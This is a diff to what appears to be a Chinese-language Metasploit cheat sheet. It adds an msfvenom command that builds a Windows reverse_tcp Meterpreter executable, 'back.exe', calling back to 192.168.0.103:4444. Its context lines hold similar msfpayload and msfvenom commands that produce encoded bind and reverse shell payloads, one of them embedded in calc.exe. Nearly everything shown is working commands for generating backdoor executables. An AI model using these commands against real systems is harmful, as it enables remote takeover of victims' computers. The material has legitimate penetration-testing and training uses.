@@ -452,6 +452,8 @@ msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -x calc.exe -k-
 七、MSFvenom
 msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai LHOST=172.14.1.32 LPORT=443 > msf.exe
 
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.103 lport=4444 -f exe -o back.exe
+
 创建和编码攻击载荷
 
 八、Meterpreter后渗透攻击阶段命令
